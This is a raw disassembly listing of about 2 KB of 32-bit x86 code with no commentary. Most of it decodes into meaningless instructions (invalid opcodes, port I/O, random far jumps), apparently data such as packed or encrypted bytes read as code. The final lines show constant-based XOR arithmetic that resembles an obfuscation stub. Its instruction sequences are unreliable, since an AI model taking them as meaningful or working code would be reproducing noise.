  419515:	sub    bl,bl
  419517:	int3   
  419518:	add    DWORD PTR [ebx+0x5dc8ce47],esp
  41951e:	xchg   ecx,eax
  41951f:	(bad)  
  419520:	pop    edx
  419521:	sbb    al,0xf8
  419523:	or     al,0x4
  419525:	mul    esp
  419527:	imul   edi,eax,0x42df7717
  41952d:	add    eax,0x9257f82
  419532:	sbb    ch,al
  419534:	lods   al,BYTE PTR ds:[esi]
  419535:	dec    edi
  419536:	cmc    
  419537:	sub    esi,DWORD PTR [esi+0x20f8c45c]
  41953d:	ds ss dec edi
  419540:	inc    esp
  419541:	nop
  419542:	cmp    ecx,DWORD PTR [ecx-0x3f]
  419545:	retf   0x4466
  419548:	xor    al,ah
  41954a:	fs push ecx
  41954c:	shl    BYTE PTR ds:0xda947738,0xb4
  419553:	jmp    0xa0ce26ef
  419558:	mov    dl,0x14
  41955a:	int    0xc4
  41955c:	out    0x18,al
  41955e:	scas   al,BYTE PTR es:[edi]
  41955f:	fsubr  DWORD PTR [esi+0x6838376a]
  419565:	xor    al,0x2a
  419567:	arpl   WORD PTR [eax-0x35],dx
  41956a:	xchg   esi,eax
  41956b:	(bad)  
  41956c:	cld    
  41956d:	imul   edx,DWORD PTR [edx],0x7fe61a7
  419573:	cmc    
  419574:	lahf   
  419575:	and    eax,0xed713479
  41957a:	xor    DWORD PTR [ebx-0x58],esi
  41957d:	inc    edi
  41957e:	or     BYTE PTR [edi-0x52],bh
  419581:	lahf   
  419582:	repz (bad) 
  419584:	mov    eax,ds:0xb3178e12
  419589:	into   
  41958a:	cmc    
  41958b:	(bad)  
  41958c:	cld    
  41958d:	inc    edx
  41958e:	jmp    0xd2a5:0x72e7012a
  419595:	(bad)  
  419596:	adc    esp,DWORD PTR [esi-0xe]
  419599:	xchg   BYTE PTR [ecx+0x50a94221],dh
  41959f:	mov    ds:0x2e124b1b,eax
  4195a4:	mov    esp,0x21f16b4c
  4195a9:	xchg   esi,eax
  4195aa:	xchg   ebx,eax
  4195ab:	jg     0x4195c0
  4195ad:	mov    ebp,0xb98bd0f9
  4195b2:	out    0xbd,eax
  4195b4:	push   ds
  4195b5:	xor    al,0x7f
  4195b7:	out    0x9c,al
  4195b9:	jmp    0xefb0:0x8eea74a8
  4195c0:	nop
  4195c1:	cld    
  4195c2:	stos   BYTE PTR es:[edi],al
  4195c3:	popa   
  4195c4:	push   ecx
  4195c5:	mov    ecx,0xb4b2e4d3
  4195ca:	pop    ss
  4195cb:	imul   esi,ecx,0x4
  4195ce:	dec    edi
  4195cf:	push   ebx
  4195d0:	xlat   BYTE PTR ds:[ebx]
  4195d1:	xor    cl,bl
  4195d3:	push   ds
  4195d4:	in     al,0xe9
  4195d6:	stos   BYTE PTR es:[edi],al
  4195d7:	cmp    al,0x2d
  4195d9:	adc    BYTE PTR [ebp-0x40148249],ch
  4195df:	les    esi,FWORD PTR [esi+edx*4-0x3972bdef]
  4195e6:	icebp  
  4195e7:	mov    esp,0x889a34c1
  4195ec:	jl     0x4195ec
  4195ee:	mov    cl,0x8
  4195f0:	xchg   edx,eax
  4195f1:	add    DWORD PTR [eax],eax
  4195f3:	mov    ah,0xc8
  4195f5:	pop    ebx
  4195f6:	jg     0x419674
  4195f8:	fisttp WORD PTR [edi-0x46]
  4195fb:	lds    ecx,FWORD PTR [edx+0x7d26fa61]
  419601:	inc    esp
  419602:	jp     0x419600
  419604:	push   ebp
  419605:	rcr    BYTE PTR [edx+ecx*1-0x4],0xa5
  41960a:	sbb    edi,edi
  41960c:	in     al,0xd9
  41960e:	fnsave [ecx]
  419610:	(bad)  
  419611:	outs   dx,DWORD PTR ds:[esi]
  419612:	mov    esi,0xb9036ee7
  419617:	mov    ah,0xee
  419619:	mov    es,WORD PTR [ebx+0x7f]
  41961c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41961e:	and    bh,BYTE PTR [eax]
  419620:	sub    DWORD PTR [ebp+ecx*8-0x365b4ab2],esp
  419627:	xor    BYTE PTR [edi+edx*2-0x5f],al
  41962b:	cli    
  41962c:	int3   
  41962d:	cmp    cl,BYTE PTR [eax+ecx*1-0x37]
  419631:	rcr    DWORD PTR [eax-0x31],0xb
  419635:	jmp    0xbc98:0x1d63a465
  41963c:	mov    eax,ds:0xf90633b
  419641:	jbe    0x41969d
  419643:	loope  0x41969f
  419645:	adc    al,0x20
  419647:	scas   al,BYTE PTR es:[edi]
  419648:	sbb    eax,0xfe6a7d52
  41964d:	or     eax,0xf4bfe955
  419652:	xor    al,0xd0
  419654:	stos   DWORD PTR es:[edi],eax
  419655:	int    0xde
  419657:	sar    al,0x48
  41965a:	lock retf 0xe71b
  41965e:	sub    eax,0xa48d1cd8
  419663:	jb     0x41968a
  419665:	inc    edx
  419666:	xchg   BYTE PTR [ecx],bh
  419668:	xor    al,0xf1
  41966a:	rol    BYTE PTR [esi+0x793f53ed],cl
  419670:	scas   al,BYTE PTR es:[edi]
  419671:	and    DWORD PTR [eax-0x8],ebx
  419674:	ffree  st(0)
  419676:	ss mov eax,0x3e38fa4f
  41967c:	cdq    
  41967d:	icebp  
  41967e:	repz or BYTE PTR [ebx-0x61],bh
  419682:	imul   ebx,DWORD PTR [esi*2-0x666c9c84],0xed322050
  41968d:	or     eax,0x74331048
  419692:	ficomp DWORD PTR [edx-0x7]
  419695:	loopne 0x419632
  419697:	cwde   
  419698:	(bad)  
  419699:	push   ds
  41969a:	dec    ebx
  41969b:	retf   
  41969c:	mov    BYTE PTR [esi-0x411f5b29],dl
  4196a2:	xchg   ebp,eax
  4196a3:	or     al,0x6f
  4196a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196a6:	mov    bl,0x29
  4196a8:	push   es
  4196a9:	mov    ebx,0xe18e0c5e
  4196ae:	xchg   edi,eax
  4196af:	add    BYTE PTR [esi-0x26],ah
  4196b2:	xchg   esi,eax
  4196b3:	mov    al,0xa4
  4196b5:	xor    BYTE PTR [ebx],al
  4196b7:	mov    cl,0x38
  4196b9:	test   DWORD PTR [edx+esi*1-0x5c30e595],edx
  4196c0:	cmc    
  4196c1:	xor    al,0xf2
  4196c3:	lods   eax,DWORD PTR ds:[esi]
  4196c4:	stc    
  4196c5:	pop    es
  4196c6:	sub    esp,ebx
  4196c8:	mov    BYTE PTR [edi],cl
  4196ca:	or     ebp,DWORD PTR [edi+ecx*2+0x32]
  4196ce:	sbb    eax,DWORD PTR [eax+0x135ff717]
  4196d4:	inc    ebx
  4196d5:	mov    esi,cs
  4196d7:	inc    ebp
  4196d8:	lahf   
  4196d9:	test   DWORD PTR [ebp+0xfd0cf4f],esp
  4196df:	jmp    0x419700
  4196e1:	jg     0x41974f
  4196e3:	sub    edx,eax
  4196e5:	mov    edi,0xcdb31954
  4196ea:	shl    DWORD PTR [ebp-0x3b],0x96
  4196ee:	pop    ds
  4196ef:	push   ecx
  4196f0:	in     al,dx
  4196f1:	cmp    cl,dh
  4196f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f4:	cmp    BYTE PTR [edx+edx*1-0x71c0da4b],cl
  4196fb:	imul   ebx,DWORD PTR [eax+0x4a333e1e],0x6684f85d
  419705:	dec    esp
  419706:	rol    BYTE PTR [ebx+0x2c],1
  419709:	xor    al,0x8f
  41970b:	adc    dl,BYTE PTR [ebp-0x1bd7b673]
  419711:	inc    edx
  419712:	pop    ebp
  419713:	or     DWORD PTR [edx+0x25],ebp
  419716:	adc    ecx,ebp
  419718:	xor    BYTE PTR [esp+eiz*4+0x39],al
  41971c:	xchg   BYTE PTR [esi+0x5f0811f3],ah
  419722:	test   eax,esi
  419724:	cvtps2pi mm4,xmm3
  419727:	and    DWORD PTR [esi],esp
  419729:	xchg   edx,eax
  41972a:	push   edi
  41972b:	jne    0x4196c7
  41972d:	fisubr WORD PTR [edi+0x72]
  419730:	inc    esi
  419731:	in     eax,dx
  419732:	pop    ss
  419733:	xor    ebp,DWORD PTR ds:0xcd95ad7e
  419739:	les    ebx,FWORD PTR [ecx]
  41973b:	js     0x419709
  41973d:	dec    esp
  41973e:	jbe    0x419714
  419740:	inc    ebx
  419741:	pop    ds
  419742:	push   DWORD PTR [esi-0x30afd9dd]
  419748:	out    0x74,al
  41974a:	inc    ebx
  41974b:	inc    edi
  41974c:	aam    0x8f
  41974e:	out    dx,eax
  41974f:	mov    dl,0xc2
  419751:	call   FWORD PTR [ecx+0x68a6c978]
  419757:	and    DWORD PTR [edi],esi
  419759:	jo     0x4197d9
  41975b:	test   al,0x61
  41975d:	(bad)  
  41975e:	cmc    
  41975f:	and    DWORD PTR [ecx+0x7d506887],ebp
  419765:	fld    DWORD PTR ds:0x2818a08c
  41976b:	adc    bh,ch
  41976d:	pop    ebx
  41976e:	mov    eax,ds:0x9015a394
  419773:	loopne 0x41970a
  419775:	adc    ebp,ebp
  419777:	mov    ebx,0x48bde16e
  41977c:	or     DWORD PTR [ebp-0x47],ebx
  41977f:	fld    QWORD PTR [edx-0xe]
  419782:	cdq    
  419783:	call   0x7cf0d4d2
  419788:	bound  ecx,QWORD PTR [ebx-0x18]
  41978b:	push   edi
  41978c:	and    DWORD PTR fs:[esi+0x30af9e1c],0xf3817ce4
  419797:	fidiv  DWORD PTR [ebx+ebx*8-0x4322cf90]
  41979e:	pop    ds
  41979f:	jp     0x419737
  4197a1:	inc    ebx
  4197a2:	and    ah,BYTE PTR [esi]
  4197a4:	cmp    edi,ebx
  4197a6:	jns    0x4197a3
  4197a8:	(bad)  
  4197a9:	xchg   edi,eax
  4197aa:	mov    esi,0x6448f89
  4197af:	pop    edx
  4197b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197b1:	rol    BYTE PTR [edi+ebx*4],0x79
  4197b5:	mov    edi,0xd790ba23
  4197ba:	(bad)  [ebp+0x1d]
  4197bd:	adc    eax,0x95777c13
  4197c2:	mov    DWORD PTR [esi+0x4ee5aeeb],esi
  4197c8:	inc    ebx
  4197c9:	xchg   ecx,eax
  4197ca:	call   0x8ee61c0b
  4197cf:	sub    DWORD PTR [ecx+0x7fdfb99f],0xffffffa2
  4197d6:	int    0x7d
  4197d8:	xchg   ecx,ecx
  4197da:	out    dx,al
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	inc    edx
  4197dd:	aaa    
  4197de:	jecxz  0x419778
  4197e0:	dec    ebp
  4197e1:	jecxz  0x419798
  4197e3:	imul   edi,DWORD PTR [ebx-0x3e],0x0
  4197e7:	add    BYTE PTR [ebp-0x2d],0x91
  4197eb:	(bad)  
  4197ec:	(bad)  
  4197ed:	rcl    DWORD PTR [eax],0x20
  4197f0:	sbb    BYTE PTR [edi+ebx*8],al
  4197f3:	inc    edx
  4197f4:	ret    0x67fc
  4197f7:	gs pop esp
  4197f9:	and    eax,0xbd62e936
  4197fe:	cld    
  4197ff:	pop    ss
  419800:	es fwait
  419802:	inc    ebx
  419803:	(bad)  
  419804:	mov    ds:0x3c78c32e,al
  419809:	out    0xad,al
  41980b:	inc    ecx
  41980c:	pushf  
  41980d:	popa   
  41980e:	xchg   esp,eax
  41980f:	pop    edx
  419810:	push   0xb72cf5ef
  419815:	fs mov eax,0x9bf4cb41
  41981b:	js     0x419816
  41981d:	add    BYTE PTR [ebx-0x8291dbd],ah
  419823:	call   0x1546fbd
  419828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41982a:	cld    
  41982b:	cld    
  41982c:	jg     0x419860
  41982e:	js     0x4197db
  419830:	mov    bh,0x42
  419832:	pop    esp
  419833:	xchg   edx,eax
  419834:	push   ebp
  419835:	test   DWORD PTR [edi+0x29b87266],esi
  41983b:	push   edi
  41983c:	loope  0x41985b
  41983e:	jae    0x41985e
  419840:	jmp    0xc794:0x44372f0e
  419847:	sub    eax,0x5bed1400
  41984c:	xchg   ebx,eax
  41984d:	push   esp
  41984e:	sahf   
  41984f:	imul   ebx,edx,0x13
  419852:	jmp    0x9270:0xb7fe802a
  419859:	push   cs
  41985a:	nop
  41985b:	fidiv  WORD PTR [edx+0x2d]
  41985e:	mov    BYTE PTR [edi],dl
  419860:	dec    esi
  419861:	jmp    0x33b91b3f
  419866:	xor    BYTE PTR [edi+0x24],al
  419869:	cmp    ebx,0x5e7ace93
  41986f:	imul   eax,DWORD PTR [edi-0x796edcf4],0x45
  419876:	xor    eax,0x6098d637
  41987b:	mov    edx,0xa789fd39
  419880:	sbb    DWORD PTR [edi],esp
  419882:	cmp    BYTE PTR [ecx],bh
  419884:	sti    
  419885:	bound  edi,QWORD PTR [ecx-0x249b0ab5]
  41988b:	js     0x41984c
  41988d:	lea    ebp,[ecx+0x6bc55ae6]
  419893:	or     edi,0x7f5a01da
  419899:	test   DWORD PTR [edi+0x37],0x6c1f79ce
  4198a0:	add    ch,BYTE PTR [eax+0x69]
  4198a3:	xor    al,0xcd
  4198a5:	jo     0x41986d
  4198a7:	push   0x60
  4198a9:	push   cs
  4198aa:	cmp    ebp,DWORD PTR [esi]
  4198ac:	jbe    0x419909
  4198ae:	push   edx
  4198af:	call   FWORD PTR [eax]
  4198b1:	xchg   esi,eax
  4198b2:	xchg   esi,eax
  4198b3:	js     0x419920
  4198b5:	dec    esp
  4198b6:	and    eax,0x3c3ff518
  4198bb:	(bad)  
  4198bc:	scas   eax,DWORD PTR es:[edi]
  4198bd:	loop   0x419864
  4198bf:	mov    bh,0x30
  4198c1:	mov    esi,0xb6fd8f4f
  4198c6:	ds push ds
  4198c8:	cmp    DWORD PTR cs:[ecx+0x58bcaf62],esp
  4198cf:	xor    ebp,DWORD PTR [edi-0x23]
  4198d2:	fist   DWORD PTR ds:0xead35203
  4198d8:	push   edi
  4198d9:	and    eax,0x1d1366b4
  4198de:	mov    ebp,0xdabc6718
  4198e3:	fdivr  DWORD PTR [eax-0x65e397db]
  4198e9:	mov    esp,edx
  4198eb:	in     eax,0x53
  4198ed:	cmp    edi,edx
  4198ef:	ins    BYTE PTR es:[edi],dx
  4198f0:	stc    
  4198f1:	sub    BYTE PTR [eax-0x42],bl
  4198f4:	bound  esp,QWORD PTR [ecx]
  4198f6:	dec    ecx
  4198f7:	fadd   QWORD PTR [edx-0x48]
  4198fa:	mov    cl,0xdd
  4198fc:	fucomp st(7)
  4198fe:	sub    al,0xde
  419900:	xchg   edx,eax
  419901:	push   esi
  419902:	ror    DWORD PTR [edx-0x4d3758a1],cl
  419908:	xchg   ebp,eax
  419909:	sub    BYTE PTR [edx],al
  41990b:	push   0xffffffaf
  41990d:	mov    ds:0xb71d98e9,al
  419912:	inc    edi
  419913:	and    dl,dh
  419915:	adc    BYTE PTR [ebx+0x20],dh
  419918:	int3   
  419919:	out    dx,eax
  41991a:	xor    al,0x69
  41991c:	pop    edx
  41991d:	mov    cl,0xa7
  41991f:	rcr    DWORD PTR [edi],cl
  419921:	sbb    esi,DWORD PTR [edx-0xef9a379]
  419927:	xor    BYTE PTR [esi-0x21],ah
  41992a:	scas   al,BYTE PTR es:[edi]
  41992b:	retf   
  41992c:	out    dx,eax
  41992d:	cmp    DWORD PTR [esi+0x4f25516b],0x3926057a
  419937:	pushf  
  419938:	and    DWORD PTR [eax],0xffffffb7
  41993b:	mov    ds:0x19600e92,eax
  419940:	mov    WORD PTR [edx+0x5da02d18],ss
  419946:	adc    BYTE PTR [ecx],dh
  419948:	clc    
  419949:	and    dl,BYTE PTR [ebx-0x22ecd262]
  41994f:	jne    0x41996d
  419951:	jae    0x419995
  419953:	lods   eax,DWORD PTR ds:[esi]
  419954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419955:	(bad)  
  419956:	xchg   edx,eax
  419957:	push   0xa24bec69
  41995c:	js     0x4199cd
  41995e:	push   ecx
  41995f:	pop    ds
  419960:	sbb    al,0x1b
  419962:	pop    edi
  419963:	inc    edx
  419964:	stos   DWORD PTR es:[edi],eax
  419965:	xchg   ebx,eax
  419966:	and    eax,0xde34fe84
  41996b:	daa    
  41996c:	and    al,0x4a
  41996e:	js     0x4199ed
  419970:	add    BYTE PTR fs:[ecx-0x23d389c1],ah
  419977:	test   eax,0x123a9c18
  41997c:	imul   eax,DWORD PTR [esi],0x69020a2b
  419982:	dec    ecx
  419983:	(bad)  
  419985:	sbb    DWORD PTR [ebx-0x33e6d921],esp
  41998b:	loopne 0x4199d4
  41998d:	sti    
  41998e:	arpl   di,ax
  419990:	adc    esp,edi
  419992:	lahf   
  419993:	stos   BYTE PTR es:[edi],al
  419994:	repnz push ecx
  419996:	gs out dx,al
  419998:	sar    BYTE PTR [edi],1
  41999a:	jmp    DWORD PTR [edi+0x7c73e6c8]
  4199a0:	dec    ecx
  4199a1:	or     eax,0xc4aaddf3
  4199a6:	push   ebp
  4199a7:	ficom  DWORD PTR [esi+0x18b56138]
  4199ad:	out    0x7c,al
  4199af:	in     al,0x4
  4199b1:	mov    dh,0xc3
  4199b3:	test   eax,0x8d464ce7
  4199b8:	jne    0x419a13
  4199ba:	popf   
  4199bb:	retf   0x64ff
  4199be:	push   0x2f
  4199c0:	not    BYTE PTR [ecx+0x34]
  4199c3:	outs   dx,DWORD PTR ds:[esi]
  4199c4:	scas   eax,DWORD PTR es:[edi]
  4199c5:	ficomp DWORD PTR [edx+0x7c899b8e]
  4199cb:	test   eax,0xee26da7e
  4199d0:	sbb    bl,cl
  4199d2:	test   al,0x5f
  4199d4:	jl     0x419a2a
  4199d6:	mov    cs,WORD PTR [edx]
  4199d8:	mov    dh,0xc1
  4199da:	mov    ds:0xa771820d,al
  4199df:	cwde   
  4199e0:	jns    0x419a47
  4199e2:	inc    edi
  4199e3:	(bad)  
  4199e4:	jmp    0x52eb:0x8fcf5622
  4199eb:	mov    ds,WORD PTR [edx-0x32f5facb]
  4199f1:	shl    BYTE PTR [esi+0x2c27379d],1
  4199f7:	repnz scas eax,DWORD PTR es:[edi]
  4199f9:	(bad)  
  4199fa:	out    dx,al
  4199fb:	sub    BYTE PTR [ecx],0xb5
  4199fe:	jle    0x419a61
  419a00:	fs jnp 0x4199e7
  419a03:	mov    al,ds:0xf2e87726
  419a08:	xchg   BYTE PTR [ebp+0x63],bh
  419a0b:	pop    edx
  419a0c:	or     DWORD PTR [ebp-0x796f4136],eax
  419a12:	lock jecxz 0x419a0f
  419a15:	pop    es
  419a16:	jae    0x4199c8
  419a18:	shr    DWORD PTR [eax],1
  419a1a:	xor    al,0x9d
  419a1c:	adc    eax,0x5e2d62da
  419a21:	call   ecx
  419a23:	jmp    0x419a7c
  419a25:	dec    edx
  419a26:	(bad)  
  419a27:	mov    ch,0x5
  419a29:	clc    
  419a2a:	or     edi,DWORD PTR [esi+ebp*1+0x75]
  419a2e:	sub    ch,BYTE PTR [esi-0x785c6438]
  419a34:	and    BYTE PTR [eax+eiz*8-0x44c1b647],dl
  419a3b:	out    dx,eax
  419a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a3d:	mov    dh,0x27
  419a3f:	ficomp DWORD PTR [ebx-0x69]
  419a42:	xor    al,0xd3
  419a44:	dec    esi
  419a45:	retf   
  419a46:	push   DWORD PTR [ebp+0x2c]
  419a49:	push   ebx
  419a4a:	imul   edi,DWORD PTR [eax-0x6],0x3d
  419a4e:	sub    BYTE PTR [ebp-0x488d3a64],al
  419a54:	aas    
  419a55:	pop    ss
  419a56:	fnstcw WORD PTR [ecx+0x56bc6a46]
  419a5c:	(bad)  [ecx+ecx*8+0x18]
  419a60:	js     0x419a96
  419a62:	dec    eax
  419a63:	pop    ebx
  419a64:	test   BYTE PTR [esi+0x60],cl
  419a67:	xchg   BYTE PTR [ecx+0x1],dh
  419a6a:	jl     0x419aa6
  419a6c:	mov    edx,ss
  419a6e:	mov    bl,0xd2
  419a70:	and    ch,dl
  419a72:	pushf  
  419a73:	cmp    al,0x1d
  419a75:	lods   al,BYTE PTR ds:[esi]
  419a76:	sbb    BYTE PTR [esi-0x269b975e],al
  419a7c:	mov    cl,ah
  419a7e:	cmp    BYTE PTR [esi-0x45],bl
  419a81:	push   edx
  419a82:	mov    al,0x25
  419a84:	call   0x71dd0004
  419a89:	dec    edx
  419a8a:	data16 cld 
  419a8c:	stc    
  419a8d:	icebp  
  419a8e:	sbb    DWORD PTR [edi+ebx*4],esi
  419a91:	push   0xffffff80
  419a93:	call   0xa3b0e2b6
  419a98:	add    cl,BYTE PTR [edi+0x41]
  419a9b:	sub    al,0xb3
  419a9d:	daa    
  419a9e:	inc    esi
  419a9f:	test   DWORD PTR [edi],0x8a55cf9c
  419aa5:	loop   0x419a96
  419aa7:	fs mov eax,0x6e0e50cf
  419aad:	fidivr WORD PTR [eax+0x105e7581]
  419ab3:	js     0x419b0a
  419ab5:	lods   al,BYTE PTR ds:[esi]
  419ab6:	les    ebp,FWORD PTR [ebp+0x40]
  419ab9:	frstor [esi+0x172d9d16]
  419abf:	es out dx,al
  419ac1:	sub    al,0x42
  419ac3:	daa    
  419ac4:	adc    cl,al
  419ac6:	sub    BYTE PTR [edx+0x4cc1f232],0x9
  419acd:	xor    ebx,eax
  419acf:	dec    esi
  419ad0:	out    dx,eax
  419ad1:	cwde   
  419ad2:	or     BYTE PTR [esi+0x5656f933],bl
  419ad8:	ror    DWORD PTR [eax+0xd],0xf1
  419adc:	mov    eax,edi
  419ade:	retf   0x9290
  419ae1:	out    0x51,eax
  419ae3:	jecxz  0x419aca
  419ae5:	test   al,0x2e
  419ae7:	test   BYTE PTR [ebp+0x3fdb404b],dl
  419aed:	mov    ebx,0x7a98927
  419af2:	loopne 0x419b48
  419af4:	scas   eax,DWORD PTR es:[edi]
  419af5:	dec    ebp
  419af6:	pop    ebx
  419af7:	(bad)  
  419af8:	and    eax,0x836468b4
  419afd:	outs   dx,DWORD PTR ds:[esi]
  419afe:	adc    dl,BYTE PTR [edx+0x58]
  419b01:	in     al,dx
  419b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b03:	adc    eax,0x4c81b63c
  419b08:	xor    eax,edi
  419b0a:	sbb    eax,0x578b395f
  419b0f:	(bad)  
  419b10:	sbb    ecx,esi
  419b12:	and    edi,ebx
  419b14:	xor    BYTE PTR gs:[edi-0x7e],ch
  419b18:	push   ds
  419b19:	sti    
  419b1a:	mov    ds,WORD PTR [eax+0x225fdc93]
  419b20:	(bad)  
  419b21:	hlt    
  419b22:	das    
  419b23:	in     al,dx
  419b24:	(bad)  
  419b25:	ds add ah,dl
  419b28:	jle    0x419ad4
  419b2a:	lock mov al,0xf2
  419b2d:	call   0x52b0:0xac130ac5
  419b34:	sbb    eax,0x8f45a15
  419b39:	pop    edx
  419b3a:	jge    0x419b02
  419b3c:	xchg   ecx,eax
  419b3d:	retf   0x2c96
  419b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b41:	pop    edx
  419b42:	outs   dx,BYTE PTR ds:[esi]
  419b43:	in     eax,0x66
  419b45:	sahf   
  419b46:	cmp    dl,al
  419b48:	icebp  
  419b49:	inc    edx
  419b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b4b:	mov    al,0x13
  419b4d:	jecxz  0x419b62
  419b4f:	aam    0x7
  419b51:	test   al,0x9d
  419b53:	adc    DWORD PTR [edi*8-0x23574ac2],edx
  419b5a:	(bad)  
  419b5b:	js     0x419bc8
  419b5d:	add    DWORD PTR [ebx-0x7b857489],esi
  419b63:	test   DWORD PTR [esi+0x67f1b0a],0x6bbd7df7
  419b6d:	jae    0x419bd2
  419b6f:	aad    0x8f
  419b71:	mov    ecx,0xdc3ae8b
  419b76:	pop    ss
  419b77:	or     al,0xdb
  419b79:	sti    
  419b7a:	xchg   ch,ch
  419b7c:	nop
  419b7d:	stos   DWORD PTR es:[edi],eax
  419b7e:	pop    ss
  419b7f:	add    DWORD PTR [esi+0x79f11ae3],edx
  419b85:	inc    edx
  419b86:	xchg   edi,eax
  419b87:	push   ds
  419b88:	mov    al,ds:0xcf5dc8c6
  419b8d:	adc    eax,0x2088e7ae
  419b92:	ds mov ebp,0x7a93a997
  419b98:	xor    ecx,DWORD PTR [eax+0x6b669e2d]
  419b9e:	jns    0x419bf1
  419ba0:	cmp    eax,DWORD PTR [edi+0x6b08fcd2]
  419ba6:	loope  0x419b7c
  419ba8:	xor    eax,0xb621a424
  419bad:	xor    al,0x2f
  419baf:	(bad)
  419bb2:	leave  
  419bb3:	or     ebp,DWORD PTR [ebp+0x56038d49]
  419bb9:	push   edx
  419bba:	out    dx,eax
  419bbb:	es inc ebx
  419bbd:	fimul  DWORD PTR [esp+esi*1+0x17]
  419bc1:	dec    ecx
  419bc2:	loopne 0x419b56
  419bc4:	mov    cl,0x32
  419bc6:	loopne 0x419c2b
  419bc8:	stos   BYTE PTR es:[edi],al
  419bc9:	mov    dl,0x91
  419bcb:	test   BYTE PTR [edx+0x30],0x4
  419bcf:	gs inc ecx
  419bd1:	jecxz  0x419bcb
  419bd3:	and    al,0xc1
  419bd5:	push   0x3023d923
  419bda:	sbb    edi,DWORD PTR [ebx+esi*4-0x1d]
  419bde:	pop    ebp
  419bdf:	cmp    DWORD PTR [esi+0x32311c34],esi
  419be5:	test   BYTE PTR [ebp-0x76b24338],bh
  419beb:	add    ah,BYTE PTR [edx]
  419bed:	fucomi st,st(0)
  419bef:	push   cs
  419bf0:	out    0xa7,eax
  419bf2:	xlat   BYTE PTR ds:[ebx]
  419bf3:	pop    edx
  419bf4:	data16 aas 
  419bf6:	cdq    
  419bf7:	jo     0x419c38
  419bf9:	and    edi,DWORD PTR [edi-0x68bb405e]
  419bff:	cwde   
  419c00:	push   ss
  419c01:	fistp  DWORD PTR [eax+0x2b]
  419c04:	dec    edi
  419c05:	cmp    esi,DWORD PTR [ebx]
  419c07:	imul   ebx,DWORD PTR [ebp-0x29bb073],0x7e939f46
  419c11:	mov    al,0x74
  419c13:	aas    
  419c14:	adc    DWORD PTR [ebx+0x399cc11b],0x9fa21a3c
  419c1e:	add    ch,BYTE PTR [ebp+0x25]
  419c21:	or     al,cl
  419c23:	jne    0x419c93
  419c25:	or     cl,BYTE PTR [eax]
  419c27:	pop    ds
  419c28:	gs aaa 
  419c2a:	mov    bl,dl
  419c2c:	push   es
  419c2d:	mov    eax,0xe68a992b
  419c32:	fs cmp eax,0x8fe3c478
  419c38:	jecxz  0x419cb7
  419c3a:	xor    ebx,esi
  419c3c:	xor    eax,0x578cdc7e
  419c41:	outs   dx,DWORD PTR ds:[esi]
  419c42:	outs   dx,BYTE PTR ds:[esi]
  419c43:	push   ebx
  419c44:	or     DWORD PTR [edi],ebp
  419c46:	inc    eax
  419c47:	mov    cs,WORD PTR [edi+eax*8-0x444d0af6]
  419c4e:	retf   0x74c8
  419c51:	add    ebx,edi
  419c53:	mov    ch,0x7c
  419c55:	shl    DWORD PTR ds:0xc8f6fe5e,0x3
  419c5c:	aaa    
  419c5d:	mov    ebp,0x4cf36106
  419c62:	adc    ah,ch
  419c64:	icebp  
  419c65:	dec    ecx
  419c66:	(bad)  
  419c67:	mov    eax,0x44e3b7cd
  419c6c:	mov    ebx,0x671aad22
  419c71:	and    BYTE PTR [ebx-0x62d45c24],dl
  419c77:	cld    
  419c78:	sar    BYTE PTR [esi-0x5ec8e7e9],1
  419c7e:	cli    
  419c7f:	jno    0x419c8b
  419c81:	xor    eax,0x4b50f7c1
  419c86:	mov    ebp,0x860e4261
  419c8b:	test   eax,0xb7e66ed2
  419c90:	sub    BYTE PTR [ecx+0x48],cl
  419c93:	mov    ds:0x922c3a92,eax
  419c98:	add    ecx,DWORD PTR ds:0xe5e7b1f7
  419c9e:	(bad)  
  419c9f:	icebp  
  419ca0:	imul   esi,DWORD PTR [ecx],0x29
  419ca3:	gs and eax,0x6fe9b3de
  419ca9:	fld    st(0)
  419cab:	push   edi
  419cac:	lea    ecx,[ebx]
  419cae:	mov    bh,0xba
  419cb0:	loop   0x419d10
  419cb2:	mov    BYTE PTR [esi*4-0xb36d133],bl
  419cb9:	adc    eax,0x1d0062da
  419cbe:	out    0x33,eax
  419cc0:	sbb    dl,ah
  419cc2:	mov    esi,ebx
  419cc4:	cmc    
  419cc5:	xchg   edx,eax
  419cc6:	aad    0x96
  419cc8:	mov    ebx,0xffa9248e
  419ccd:	out    0x58,eax
  419ccf:	loop   0x419d2f
  419cd1:	fadd   st,st(4)
  419cd3:	xor    ecx,edx
  419cd5:	outs   dx,DWORD PTR ds:[esi]
  419cd6:	int3   
  419cd7:	inc    edx
  419cd8:	adc    dh,BYTE PTR fs:[esi-0x1f]
  419cdc:	pop    esp
  419cdd:	mov    ecx,0xf1fbeaac
  419ce2:	pop    ecx
  419ce3:	inc    ecx
  419ce4:	jmp    0xb2a6:0xf1c36c69
  419ceb:	dec    edx
  419cec:	mov    ebx,DWORD PTR [ebp-0x28]
  419cef:	mov    edi,DWORD PTR [ebp-0x24]
  419cf2:	and    eax,esi
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
